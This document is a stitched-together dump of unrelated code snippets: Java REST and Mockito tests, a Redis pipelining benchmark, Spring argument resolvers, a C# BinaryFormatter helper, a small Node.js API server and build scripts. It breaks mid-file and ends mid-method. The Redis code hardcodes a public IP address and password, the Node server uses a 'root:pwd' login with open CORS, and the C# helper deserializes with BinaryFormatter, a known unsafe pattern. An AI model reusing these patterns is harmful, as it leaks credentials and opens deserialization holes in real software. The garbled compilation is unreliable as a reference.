			getAttributes().put(name, value);
		}
	}
}
------------------------------------------------------------
$ sudo docker run -d --restart=unless-stopped -p 80:80 -p 443:443 rancher/rancher
------------------------------------------------------------
@BeforeMethod
public void configureRestAssured(...) {
   RestAssured.baseURI = "http://cookiemonster.com";
   RestAssured.requestSpecification = given()
       .header("Language", "en");
   RestAssured.filters(new RequestLoggingFilter(), new ResponseLoggingFilter());
...
}

public class OAuth2Filter implements AuthFilter {

   String accessToken;

   OAuth2Filter(String accessToken) {
       this.accessToken = accessToken;
   }

   @Override
   public Response filter(FilterableRequestSpecification requestSpec, FilterableResponseSpecification responseSpec, FilterContext ctx) {
       requestSpec.replaceHeader("Authorization", "Bearer " + accessToken);
       return ctx.next(requestSpec, responseSpec);
   }
}

String accessToken = getAccessToken(username, password);
OAuth2Filter auth = new OAuth2Filter(accessToken);

given()
   .filter(auth)
   .filter(new RequestLoggingFilter())
   .filter(new ResponseLoggingFilter())
...



given()
   .filter(auth)
   .filter(new RequestLoggingFilter())
…

given()
   .filter(new RequestLoggingFilter())
   .filter(auth)
   

@Test
public void shouldCorrectlyCountAddedCookies() {
   Integer addNumber = 10;

   JsonPath beforeCookies = given()
           .when()
           .get("/latestcookies")
           .then()
           .assertThat()
           .statusCode(200)
           .extract()
           .jsonPath();

   String beforeId = beforeCookies.getString("id");

   JsonPath afterCookies = given()
           .body(String.format("{number: %s}", addNumber))
           .when()
           .put("/cookies")
           .then()
           .assertThat()
           .statusCode(200)
           .extract()
           .jsonPath();

   Integer afterNumber = afterCookies.getInt("number");
   String afterId = afterCookies.getString("id");
   JsonPath history = given()
           .when()
           .get("/history")
           .then()
           .assertThat()
           .statusCode(200)
           .extract()
           .jsonPath();

   assertThat(history.getInt(String.format("records.find{r -> r.id == %s}.number", beforeId)))
           .isEqualTo(afterNumber - addNumber);
   assertThat(history.getInt(String.format("records.find{r -> r.id == %s}.number", afterId)))
           .isEqualTo(afterNumber);
}


------------------------------------------------------------
World  mockWorld = mock(World.class); 

doAnswer(new Answer<Void>() {

    public Void answer(InvocationOnMock invocation) {

      Object[] args = invocation.getArguments();

      System.out.println("called with arguments: " + Arrays.toString(args));

      return null;

    }

}).when(mockWorld).setState(anyString());
------------------------------------------------------------
public byte[] ToByteArray<T>(T obj)
{
    if(obj == null)
        return null;
    BinaryFormatter bf = new BinaryFormatter();
    using(MemoryStream ms = new MemoryStream())
    {
        bf.Serialize(ms, obj);
        return ms.ToArray();
    }
}

public T FromByteArray<T>(byte[] data)
{
    if(data == null)
         return default(T);
    BinaryFormatter bf = new BinaryFormatter();
    using(MemoryStream ms = new MemoryStream(data))
    {
        object obj = bf.Deserialize(ms);
        return (T)obj;
    }
}
------------------------------------------------------------
import java.io.IOException;
import java.util.Arrays;
import java.util.List;

import com.google.common.io.Closeables;

import redis.clients.jedis.Jedis;
import redis.clients.jedis.JedisPoolConfig;
import redis.clients.jedis.JedisShardInfo;
import redis.clients.jedis.Pipeline;
import redis.clients.jedis.ShardedJedis;
import redis.clients.jedis.ShardedJedisPipeline;
import redis.clients.jedis.ShardedJedisPool;
import redis.clients.jedis.Transaction;

public class RedisExample {

	public static void main(String[] args) {
		new RedisExample().testNormal();
	}

	// 普通同步方式
	public void testNormal() {// 12.526秒
		Jedis jedis = new Jedis("120.25.241.144", 6379);
		jedis.auth("b840fc02d52404542994");

		long start = System.currentTimeMillis();
		for (int i = 0; i < 1000; i++) {
			jedis.set("n" + i, "n" + i);
			System.out.println(i);
		}
		long end = System.currentTimeMillis();
		System.out.println("共花费：" + (end - start) / 1000.0 + "秒");

		jedis.disconnect();
		try {
			Closeables.close(jedis, true);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	// 事务方式(Transactions)
	public void testTrans() {// 0.304秒
		Jedis jedis = new Jedis("120.25.241.144", 6379);
		jedis.auth("b840fc02d52404542994");

		long start = System.currentTimeMillis();
		Transaction tx = jedis.multi();
		for (int i = 0; i < 1000; i++) {
			tx.set("n" + i, "n" + i);
			System.out.println(i);
		}
		tx.exec();
		long end = System.currentTimeMillis();
		System.out.println("共花费：" + (end - start) / 1000.0 + "秒");

		jedis.disconnect();
		try {
			Closeables.close(jedis, true);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	// 管道(Pipelining)
	public void testPipelined() {// 0.076秒
		Jedis jedis = new Jedis("120.25.241.144", 6379);
		jedis.auth("b840fc02d52404542994");

		long start = System.currentTimeMillis();
		Pipeline pipeline = jedis.pipelined();
		for (int i = 0; i < 1000; i++) {
			pipeline.set("n" + i, "n" + i);
			System.out.println(i);
		}
		pipeline.syncAndReturnAll();
		long end = System.currentTimeMillis();
		System.out.println("共花费：" + (end - start) / 1000.0 + "秒");

		jedis.disconnect();
		try {
			Closeables.close(jedis, true);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	// 管道中调用事务
	public void testCombPipelineTrans() {// 0.099秒
		Jedis jedis = new Jedis("120.25.241.144", 6379);
		jedis.auth("b840fc02d52404542994");

		long start = System.currentTimeMillis();
		Pipeline pipeline = jedis.pipelined();
		pipeline.multi();
		for (int i = 0; i < 1000; i++) {
			pipeline.set("n" + i, "n" + i);
			System.out.println(i);
		}
		pipeline.exec();
		pipeline.syncAndReturnAll();
		long end = System.currentTimeMillis();
		System.out.println("共花费：" + (end - start) / 1000.0 + "秒");

		jedis.disconnect();
		try {
			Closeables.close(jedis, true);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	// 分布式直连同步调用
	public void testShardNormal() {// 13.619秒
		JedisShardInfo jedis = new JedisShardInfo("120.25.241.144", 6379);
		jedis.setPassword("b840fc02d52404542994");

		List<JedisShardInfo> shards = Arrays.asList(jedis);
		ShardedJedis sharding = new ShardedJedis(shards);

		long start = System.currentTimeMillis();
		for (int i = 0; i < 1000; i++) {
			sharding.set("n" + i, "n" + i);
			System.out.println(i);
		}
		long end = System.currentTimeMillis();
		System.out.println("共花费：" + (end - start) / 1000.0 + "秒");

		sharding.disconnect();
		try {
			Closeables.close(sharding, true);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	// 分布式直连异步调用
	public void testShardPipelined() {// 0.127秒
		JedisShardInfo jedis = new JedisShardInfo("120.25.241.144", 6379);
		jedis.setPassword("b840fc02d52404542994");

		List<JedisShardInfo> shards = Arrays.asList(jedis);
		ShardedJedis sharding = new ShardedJedis(shards);
		ShardedJedisPipeline pipeline = sharding.pipelined();

		long start = System.currentTimeMillis();
		for (int i = 0; i < 1000; i++) {
			pipeline.set("n" + i, "n" + i);
			System.out.println(i);
		}
		pipeline.syncAndReturnAll();
		long end = System.currentTimeMillis();
		System.out.println("共花费：" + (end - start) / 1000.0 + "秒");

		sharding.disconnect();
		try {
			Closeables.close(sharding, true);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	// 分布式连接池同步调用
	public void testShardSimplePool() {// 12.642秒
		JedisShardInfo jedis = new JedisShardInfo("120.25.241.144", 6379);
		jedis.setPassword("b840fc02d52404542994");

		List<JedisShardInfo> shards = Arrays.asList(jedis);
		ShardedJedisPool pool = new ShardedJedisPool(new JedisPoolConfig(), shards);

		ShardedJedis sharding = pool.getResource();

		long start = System.currentTimeMillis();
		for (int i = 0; i < 1000; i++) {
			sharding.set("n" + i, "n" + i);
			System.out.println(i);
		}
		long end = System.currentTimeMillis();
		System.out.println("共花费：" + (end - start) / 1000.0 + "秒");

		sharding.disconnect();
		pool.destroy();
		try {
			Closeables.close(sharding, true);
			Closeables.close(pool, true);
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	// 分布式连接池异步调用
	public void testShardPipelinnedPool() {// 0.124秒
		JedisShardInfo jedis = new JedisShardInfo("120.25.241.144", 6379);
		jedis.setPassword("b840fc02d52404542994");

		List<JedisShardInfo> shards = Arrays.asList(jedis);
		ShardedJedisPool pool = new ShardedJedisPool(new JedisPoolConfig(), shards);

		ShardedJedis sharding = pool.getResource();
		ShardedJedisPipeline pipeline = sharding.pipelined();

		long start = System.currentTimeMillis();
		for (int i = 0; i < 1000; i++) {
			pipeline.set("n" + i, "n" + i);
			System.out.println(i);
		}
		pipeline.syncAndReturnAll();
		long end = System.currentTimeMillis();
		System.out.println("共花费：" + (end - start) / 1000.0 + "秒");

		sharding.disconnect();
		pool.destroy();

		try {
			Closeables.close(sharding, true);
			Closeables.close(pool, true);
		} catch (IOException e) {
			e.printStackTrace();
		}

	}
}

mport java.util.Collections;
import java.util.Map;

import javax.servlet.ServletRequest;

import org.springframework.core.MethodParameter;
import org.springframework.core.convert.ConversionService;
import org.springframework.core.convert.TypeDescriptor;
import org.springframework.core.convert.converter.Converter;
import org.springframework.util.ClassUtils;
import org.springframework.util.StringUtils;
import org.springframework.validation.DataBinder;
import org.springframework.web.bind.ServletRequestDataBinder;
import org.springframework.web.bind.WebDataBinder;
import org.springframework.web.bind.support.WebDataBinderFactory;
import org.springframework.web.context.request.NativeWebRequest;
import org.springframework.web.context.request.RequestAttributes;
import org.springframework.web.method.annotation.ModelAttributeMethodProcessor;
import org.springframework.web.servlet.HandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.ServletRequestDataBinderFactory;

import com.google.common.base.Strings;
import com.whenling.module.domain.model.BaseEntity;
import com.whenling.module.domain.service.EntityService;

/**
 * A Servlet-specific {@link ModelAttributeMethodProcessor} that applies data
 * binding through a WebDataBinder of type {@link ServletRequestDataBinder}.
 *
 * <p>
 * Also adds a fall-back strategy to instantiate the model attribute from a URI
 * template variable or from a request parameter if the name matches the model
 * attribute name and there is an appropriate type conversion strategy.
 *
 * @author Rossen Stoyanchev
 * @since 3.1
 */
public class EntityModelAttributeMethodProcessor extends ModelAttributeMethodProcessor {

	private EntityService entityService;
	private ConversionService conversionService;

	/**
	 * @param annotationNotRequired
	 *            if "true", non-simple method arguments and return values are
	 *            considered model attributes with or without a
	 *            {@code @ModelAttribute} annotation
	 */
	public EntityModelAttributeMethodProcessor(EntityService entityService, ConversionService conversionService, boolean annotationNotRequired) {
		super(annotationNotRequired);
		this.entityService = entityService;
		this.conversionService = conversionService;
	}

	/**
	 * Instantiate the model attribute from a URI template variable or from a
	 * request parameter if the name matches to the model attribute name and if
	 * there is an appropriate type conversion strategy. If none of these are
	 * true delegate back to the base class.
	 * 
	 * @see #createAttributeFromRequestValue
	 */
	@Override
	protected final Object createAttribute(String attributeName, MethodParameter methodParam,
			WebDataBinderFactory binderFactory, NativeWebRequest request) throws Exception {

		String value = getRequestValueForAttribute(attributeName, request);
		if (value != null) {
			Object attribute = createAttributeFromRequestValue(value, attributeName, methodParam, binderFactory,
					request);
			if (attribute != null) {
				return attribute;
			}
		} else {
			Class<?> parameterType = methodParam.getParameterType();
			if (ClassUtils.isAssignable(BaseEntity.class, parameterType)) {
				String id = request.getParameter("id");
				if (!Strings.isNullOrEmpty(id)) {
					return conversionService.convert(id, methodParam.getParameterType());
				} else {
					return entityService.getService(parameterType).newEntity();
				}
			}
		}

		return super.createAttribute(attributeName, methodParam, binderFactory, request);
	}

	/**
	 * Obtain a value from the request that may be used to instantiate the model
	 * attribute through type conversion from String to the target type.
	 * <p>
	 * The default implementation looks for the attribute name to match a URI
	 * variable first and then a request parameter.
	 * 
	 * @param attributeName
	 *            the model attribute name
	 * @param request
	 *            the current request
	 * @return the request value to try to convert or {@code null}
	 */
	protected String getRequestValueForAttribute(String attributeName, NativeWebRequest request) {
		Map<String, String> variables = getUriTemplateVariables(request);
		if (StringUtils.hasText(variables.get(attributeName))) {
			return variables.get(attributeName);
		} else if (StringUtils.hasText(request.getParameter(attributeName))) {
			return request.getParameter(attributeName);
		} else {
			return null;
		}
	}

	@SuppressWarnings("unchecked")
	protected final Map<String, String> getUriTemplateVariables(NativeWebRequest request) {
		Map<String, String> variables = (Map<String, String>) request
				.getAttribute(HandlerMapping.URI_TEMPLATE_VARIABLES_ATTRIBUTE, RequestAttributes.SCOPE_REQUEST);
		return (variables != null ? variables : Collections.<String, String> emptyMap());
	}

	/**
	 * Create a model attribute from a String request value (e.g. URI template
	 * variable, request parameter) using type conversion.
	 * <p>
	 * The default implementation converts only if there a registered
	 * {@link Converter} that can perform the conversion.
	 * 
	 * @param sourceValue
	 *            the source value to create the model attribute from
	 * @param attributeName
	 *            the name of the attribute, never {@code null}
	 * @param methodParam
	 *            the method parameter
	 * @param binderFactory
	 *            for creating WebDataBinder instance
	 * @param request
	 *            the current request
	 * @return the created model attribute, or {@code null}
	 * @throws Exception
	 */
	protected Object createAttributeFromRequestValue(String sourceValue, String attributeName,
			MethodParameter methodParam, WebDataBinderFactory binderFactory, NativeWebRequest request)
					throws Exception {

		DataBinder binder = binderFactory.createBinder(request, null, attributeName);
		ConversionService conversionService = binder.getConversionService();
		if (conversionService != null) {
			TypeDescriptor source = TypeDescriptor.valueOf(String.class);
			TypeDescriptor target = new TypeDescriptor(methodParam);
			if (conversionService.canConvert(source, target)) {
				return binder.convertIfNecessary(sourceValue, methodParam.getParameterType(), methodParam);
			}
		}
		return null;
	}

	/**
	 * This implementation downcasts {@link WebDataBinder} to
	 * {@link ServletRequestDataBinder} before binding.
	 * 
	 * @see ServletRequestDataBinderFactory
	 */
	@Override
	protected void bindRequestParameters(WebDataBinder binder, NativeWebRequest request) {
		ServletRequest servletRequest = request.getNativeRequest(ServletRequest.class);
		ServletRequestDataBinder servletBinder = (ServletRequestDataBinder) binder;
		servletBinder.bind(servletRequest);
	}
}

import java.net.URLDecoder;
import java.util.List;

import org.springframework.core.MethodParameter;
import org.springframework.core.ResolvableType;
import org.springframework.core.convert.ConversionService;
import org.springframework.core.convert.support.DefaultConversionService;
import org.springframework.data.querydsl.binding.QuerydslBinderCustomizer;
import org.springframework.data.querydsl.binding.QuerydslBindings;
import org.springframework.data.querydsl.binding.QuerydslBindingsFactory;
import org.springframework.data.querydsl.binding.QuerydslPredicate;
import org.springframework.data.querydsl.binding.QuerydslPredicateBuilder;
import org.springframework.data.util.ClassTypeInformation;
import org.springframework.data.util.TypeInformation;
import org.springframework.data.web.querydsl.QuerydslPredicateArgumentResolver;
import org.springframework.util.ClassUtils;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.bind.support.WebDataBinderFactory;
import org.springframework.web.context.request.NativeWebRequest;
import org.springframework.web.method.support.HandlerMethodArgumentResolver;
import org.springframework.web.method.support.ModelAndViewContainer;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.google.common.base.Strings;
import com.google.common.collect.Lists;
import com.mysema.query.types.Predicate;
import com.whenling.module.web.controller.EntityController;

public class DefaultPredicateArgumentResolver implements HandlerMethodArgumentResolver {

	private final QuerydslBindingsFactory bindingsFactory;
	private final QuerydslPredicateBuilder predicateBuilder;

	/**
	 * Creates a new {@link QuerydslPredicateArgumentResolver} using the given
	 * {@link ConversionService}.
	 * 
	 * @param factory
	 * @param conversionService
	 *            defaults to {@link DefaultConversionService} if
	 *            {@literal null}.
	 */
	public DefaultPredicateArgumentResolver(QuerydslBindingsFactory factory, ConversionService conversionService) {

		this.bindingsFactory = factory;
		this.predicateBuilder = new QuerydslPredicateBuilder(
				conversionService == null ? new DefaultConversionService() : conversionService,
				factory.getEntityPathResolver());
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see
	 * org.springframework.web.method.support.HandlerMethodArgumentResolver#
	 * supportsParameter(org.springframework.core.MethodParameter)
	 */
	@Override
	public boolean supportsParameter(MethodParameter parameter) {

		if (Predicate.class.equals(parameter.getParameterType())) {
			return true;
		}

		if (parameter.hasParameterAnnotation(QuerydslPredicate.class)) {
			throw new IllegalArgumentException(
					String.format("Parameter at position %s must be of type Predicate but was %s.",
							parameter.getParameterIndex(), parameter.getParameterType()));
		}

		return false;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see
	 * org.springframework.web.method.support.HandlerMethodArgumentResolver#
	 * resolveArgument(org.springframework.core.MethodParameter,
	 * org.springframework.web.method.support.ModelAndViewContainer,
	 * org.springframework.web.context.request.NativeWebRequest,
	 * org.springframework.web.bind.support.WebDataBinderFactory)
	 */
	@Override
	public Predicate resolveArgument(MethodParameter parameter, ModelAndViewContainer mavContainer,
			NativeWebRequest webRequest, WebDataBinderFactory binderFactory) throws Exception {

		MultiValueMap<String, String> parameters = new LinkedMultiValueMap<String, String>();

		String filterString = webRequest.getParameter("filter");
		if (!Strings.isNullOrEmpty(filterString)) {
			filterString = URLDecoder.decode(filterString, "UTF-8");
			Object filters = JSON.parse(filterString);

			if (filters instanceof JSONArray) {
				for (Object filter : (JSONArray) filters) {
					if (filter instanceof JSONObject) {

						String property = ((JSONObject) filter).getString("property");

						Object value = ((JSONObject) filter).get("value");
						List<String> valueList = null;
						if (value instanceof JSONArray) {
							valueList = Lists.transform((JSONArray) value, (jsonObject) -> {
								return (String) jsonObject;
							});
						} else {
							if (value != null) {
								valueList = Lists.newArrayList(value.toString());
							}
						}

						parameters.put(property, valueList);
					}
				}
			}

		}

		QuerydslPredicate annotation = parameter.getParameterAnnotation(QuerydslPredicate.class);
		TypeInformation<?> domainType = extractTypeInfo(parameter).getActualType();

		@SuppressWarnings("rawtypes")
		Class<? extends QuerydslBinderCustomizer> customizer = annotation == null ? null : annotation.bindings();
		QuerydslBindings bindings = bindingsFactory.createBindingsFor(customizer, domainType);

		return predicateBuilder.getPredicate(domainType, parameters, bindings);
	}

	/**
	 * Obtains the domain type information from the given method parameter. Will
	 * favor an explicitly registered on through
	 * {@link QuerydslPredicate#root()} but use the actual type of the method's
	 * return type as fallback.
	 * 
	 * @param parameter
	 *            must not be {@literal null}.
	 * @return
	 */
	static TypeInformation<?> extractTypeInfo(MethodParameter parameter) {

		QuerydslPredicate annotation = parameter.getParameterAnnotation(QuerydslPredicate.class);

		if (annotation != null && !Object.class.equals(annotation.root())) {
			return ClassTypeInformation.from(annotation.root());
		}

		Class<?> containingClass = parameter.getContainingClass();
		if (ClassUtils.isAssignable(EntityController.class, containingClass)) {
			ResolvableType resolvableType = ResolvableType.forClass(containingClass);
			return ClassTypeInformation.from(resolvableType.as(EntityController.class).getGeneric(0).resolve());
		}

		return detectDomainType(ClassTypeInformation.fromReturnTypeOf(parameter.getMethod()));
	}

	private static TypeInformation<?> detectDomainType(TypeInformation<?> source) {

		if (source.getTypeArguments().isEmpty()) {
			return source;
		}

		TypeInformation<?> actualType = source.getActualType();

		if (source != actualType) {
			return detectDomainType(actualType);
		}

		if (source instanceof Iterable) {
			return source;
		}

		return detectDomainType(source.getComponentType());
	}
}

    @EnableAspectJAutoProxy
	
	
@Configuration
@ComponentScan(basePackages = { "com.whenling" }, excludeFilters = {
		@ComponentScan.Filter(value = Controller.class, type = FilterType.ANNOTATION),
		@ComponentScan.Filter(value = EnableWebMvc.class, type = FilterType.ANNOTATION),
		@ComponentScan.Filter(value = ServletSupport.class, type = FilterType.ANNOTATION) })
@EnableAspectJAutoProxy
------------------------------------------------------------
const option = {
    port: 848,
    baseAuth: 'root:pwd', //get基本认证
    dev: false, //是否打印详细日志
    mongodb: 'mongodb://localhost/api',
};
const mime = require('mime-types');
const http = require('http');
const url = require('url');
const fs = require('fs');
const logger = require('log4js').getLogger('edc-server');
const debug = logger.debug;
const info = logger.info;
const formidable = require('formidable');
const mongoose = require('mongoose');
mongoose.connect(option.mongodb, {useMongoClient: true});
mongoose.Promise = global.Promise;
const guid = function (time = 1) {
    let result = '';
    for (let i = 0; i < time; i++) {
        result += (function () {
            let c = new Date(),
                b = c.getSeconds() + '',
                d = c.getMinutes() + '',
                e = c.getMilliseconds() + '';
            for (let i = b.length, j = 2; i < j; i++) b = '0' + b;
            for (let i = d.length, j = 2; i < j; i++) d = '0' + d;
            for (let i = e.length, j = 3; i < j; i++) e = '0' + e;
            return b + d + e + (((1 + Math.random()) * 0x10000) | 0).toString(16).substring(1) + (((1 + Math.random()) * 0x10000) | 0).toString(16);
        })();
    }
    return result.toUpperCase();
};
const promise = function (fn, target) {
    return (...args) => {
        return new Promise((resolve, reject) => {
            args.push(function(err, ...data){
                if (err === null || err === undefined) return resolve.apply(this, data);
                return reject(err);
            });
            fn.apply(target, args);
        });
    };
};
const Api = mongoose.model('Api', {
    appname: String,
    description: Array,
    version: String,
    clz: String
});
const FindApi = promise(Api.find,Api);
const fs_readFile = promise(fs.readFile);
const ejs = require('ejs');
logger.debug = function () {
    if (option.dev === true) debug.call(logger, Array.prototype.slice.call(arguments, 0));
};
logger.info = function () {
    if (option.dev === true) info.call(logger, Array.prototype.slice.call(arguments, 0));
};
/**
 * 打印response数据
 * @param info
 * @param contentType
 * @param contentLength
 * @param response
 * @param status
 * @param isFile
 * @param result
 * @param location
 */
const responseWrite = function ({info = '', contentType = 'text/plain;charset=utf-8', contentLength = 0, response, status = 200, isFile = false, result = false, location = false} = {}) {
    let header = {
        'Access-Control-Allow-Headers': 'X-File-Name, X-File-Type, X-File-Size, authorization',
        'Access-Control-Allow-Methods': 'OPTIONS, HEAD, POST, GET',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Expose-Headers': 'X-Log, X-Reqid',
        'Access-Control-Max-Age': '2592000',
        'Cache-Control': 'no-store, no-cache, must-revalidate',
        'Connection': 'keep-alive',
        'Content-Type': contentType,
        'Content-Length': contentLength,
        'Date': new Date().toUTCString(),
        'Pragma': 'no-cache',
        'Server': 'nginx',
        'X-Content-Type-Options': 'nosniff',
        'X-Reqid': guid()
    };
    if (result !== false) {
        header.result = result;
    }
    if (location !== false) {
        header.Location = location;
    }
    if (info !== undefined) {
        if (isFile === false) {
            header['Content-Length'] = Buffer.byteLength(info.toString());
            response.writeHead(status, header);
            response.write(info);
        } else {
            response.writeHead(status, header);
            response.write(info, 'binary');
        }
    }
    return response.end();
};
const throwIf = (condition, message) => {
    if (condition) throw message;
};
const callback_method = {
    async 'post'(request, response) {
        let form = new formidable.IncomingForm();
        let parse = promise(form.parse, form);
        let data = await parse(request);
        try {
            throwIf(!data.appname, '必须输入appname');
            throwIf(!data.description, '必须输入description');
            throwIf(!data.version, '必须输入version');
            throwIf(!data.clz, '必须输入clz');
        }
        catch (e) {
            return responseWrite({
                response: response,
                info: 'bad request',
                status: 500
            });
        }
        let apis = await FindApi({
            appname : data.appname,
            version : data.version
        });
        apis.forEach(async iapi => (promise(iapi.remove, iapi))());
        let api = new Api(data);
        try {
            await (promise(api.save, api))();
        } catch (e) {
            throwIf(true, e);
        }
        responseWrite({
            response: response,
            info: 'success!'
        });
    },
    async 'get'(request, response) {
        let authorization = request.headers['authorization'];
        if (!authorization || new Buffer(authorization.substr(6), 'base64').toString() !== option.baseAuth) {
            response.writeHead(401, {
                'content-Type': 'text/plain',
                'WWW-Authenticate': "Basic realm='family'"
            });
            return response.end();
        }
        let fields = url.parse(request.url, true).query;
        let appname = fields.appname;
        let version = fields.version;


        let apis = await FindApi({appname,version});
        try {
            throwIf(!apis.length, 'api不存在');
        }
        catch (e) {
            return responseWrite({
                response: response,
                info: 'bad request',
                status: 500
            });
        }

        let html = await fs_readFile('api.html');
        html = ejs.render(html.toString(),apis[0],{
            cache : option.dev === false,
            filename : "api"
        });

        return responseWrite({
            response: response,
            contentType: mime.contentType('html'),
            info : html
        });
    }
};
/**
 * http method core
 * @param request
 * @param response
 * @returns {Promise.<void>}
 */
const callback = async function (request, response) {
    let method = request.method.toLowerCase();
    let req_url = decodeURIComponent(request.url);
    let urlParse = url.parse(req_url, true);
    let pathname_ = urlParse.pathname.replace(/%20|\.\.|\s/g, '');
    if (pathname_ === '/favicon.ico') return responseWrite({
        response: response,
        contentType: mime.contentType('ico')
    });
    if (callback_method[method]) {
        try {
            callback_method[method](request, response);
        }
        catch (e) {
            responseWrite({
                response: response,
                info: 'bad request',
                status: 500
            });
        }
    }
    else {
        responseWrite({
            response: response,
            info: 'error method',
            status: 405
        });
    }
};
let server = http.createServer(callback);
server.listen(option.port);
logger.info(`listening: worker ${process.pid}, Address: /: ${option.port}`);

{
  "dependencies": {
    "ejs": "^2.5.7",
    "formidable": "^1.1.1",
    "highlight.js": "^9.12.0",
    "log4js": "^1.1.1",
    "mime-types": "^2.1.15",
    "mongoose": "^4.13.2",
    "vue-highlight-component": "^1.0.0"
  },
  "name": "ApiServer"
}

@Entity
@Table(name = "appusers")
@NamedQuery(name="AppUser.findByUserName", query="SELECT u from AppUser u where LOWER(u.username) like LOWER(:username)")
public class AppUser {}

import org.springframework.web.servlet.support.AbstractAnnotationConfigDispatcherServletInitializer;

/**
 * Servlet configuration class. (Java class equivalent to web.xml.)
 * Detected automatically by SpringServletContainerInitializer,
 * which is automatically called by any servlet.
 * 
 * @author Inka
 */

public class AppInitializer extends
AbstractAnnotationConfigDispatcherServletInitializer {
	@Override
	protected Class<?>[] getRootConfigClasses() {
		return new Class<?>[] { AppConfig.class };
	}

	@Override
	protected Class<?>[] getServletConfigClasses() {
		return null;
	}
	@Override
	protected String[] getServletMappings() {
		return new String[]{"/"};
	}
}
------------------------------------------------------------
import com.groupdocs.ui.config.ServerConfiguration;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.web.context.WebServerInitializedEvent;
import org.springframework.context.ApplicationListener;
import org.springframework.stereotype.Component;

/**
 * Component for listening ApplicationContext event
 */
@Component
public class ApplicationStartup implements ApplicationListener<WebServerInitializedEvent> {

    @Autowired
    private ServerConfiguration serverConfiguration;

    /**
     * This method is called during Spring's startup.
     *
     * @param event Event raised when an ApplicationContext gets initialized or
     * refreshed.
     */
    public void onApplicationEvent(WebServerInitializedEvent event) {
        // use this event for obtaining the local port of a running server
        serverConfiguration.setHttpPort(event.getWebServer().getPort());
    }

} 
------------------------------------------------------------
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.boot.builder.SpringApplicationBuilder;
import org.springframework.context.annotation.ComponentScan;

@EnableAutoConfiguration
@ComponentScan
public class Application {

    public static void main(String... args) {
        new SpringApplicationBuilder()
                .sources(Application.class)
                .showBanner(false)
                .run(args);
    }
}
------------------------------------------------------------
<pluginManagement>
 <plugins>
   <plugin>
     <groupId>org.jbehave</groupId>
     <artifactId>jbehave-maven-plugin</artifactId>
     <version>2.0.1</version>
   </plugin>
 </plugins>
</pluginManagement>
<plugins>
 <plugin>
   <groupId>org.jbehave</groupId>
   <artifactId>jbehave-maven-plugin</artifactId>
   <executions>
     <execution>
       <id>run-scenarios-found</id>
       <phase>test</phase>
       <configuration>
         <scenarioIncludes>
           <scenarioInclude>**/scenario/**/*${test}.java</scenarioInclude>
         </scenarioIncludes>
         <scenarioExcludes>
           <scenarioExclude>**/*Steps.java</scenarioExclude>
         </scenarioExcludes>
       </configuration>
       <goals>
         <goal>run-scenarios</goal>
       </goals>
     </execution>
   </executions>
 </plugin>
</plugins>


export MVN_OPTS="-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=8787 -Xnoagent -Djava.compiler=NONE" ; mvn -Dtest=MyTest clean test mvn -e -o -Dtest=MyTest -Dmaven.surefire.debug="-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=8787 -Xnoagent -Djava.compiler=NONE" clean test


------------------------------------------------------------
#!/bin/bash

set -euo pipefail

configureTravis() {
  mkdir -p ~/.local
  curl -sSL https://github.com/SonarSource/travis-utils/tarball/v55 | tar zx --strip-components 1 -C ~/.local
  source ~/.local/bin/install
}
configureTravis

export DEPLOY_PULL_REQUEST=true

regular_mvn_build_deploy_analyze
-- --------------------------------------------------------
-- --------------------------------------------------------
-- --------------------------------------------------------
-- --------------------------------------------------------
-- --------------------------------------------------------
-- --------------------------------------------------------
-- --------------------------------------------------------
-- --------------------------------------------------------
-- --------------------------------------------------------
-- --------------------------------------------------------
-- --------------------------------------------------------

import static org.hamcrest.Matchers.is;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.when;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.asyncDispatch;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultHandlers.print;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.request;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
import static org.springframework.test.web.servlet.setup.MockMvcBuilders.standaloneSetup;
import java.util.ArrayList;
import java.util.List;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.mock.mockito.MockBean;
import org.springframework.http.MediaType;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.web.context.WebApplicationContext;
import com.mgiglione.controller.MangaController;
import com.mgiglione.model.Manga;
import com.mgiglione.service.MangaService;
@SpringBootTest
@RunWith(SpringRunner.class)
public class MangaControllerUnitTest {
    MockMvc mockMvc;
    @Autowired
    protected WebApplicationContext wac;
    @Autowired
    MangaController mangaController;
    @MockBean
    MangaService mangaService;
    /**
     * List of samples mangas
     */
    private List<Manga> mangas;
    @Before
    public void setup() throws Exception {
        this.mockMvc = standaloneSetup(this.mangaController).build();// Standalone context
        // mockMvc = MockMvcBuilders.webAppContextSetup(wac)
        // .build();
        Manga manga1 = Manga.builder()
            .title("Hokuto no ken")
            .description("The year is 199X. The Earth has been devastated by nuclear war...")
            .build();
        Manga manga2 = Manga.builder()
            .title("Yumekui Kenbun")
            .description("For those who suffer nightmares, help awaits at the Ginseikan Tea House, where patrons can order much more than just Darjeeling. Hiruko is a special kind of a private investigator. He's a dream eater....")
            .build();
        mangas = new ArrayList<>();
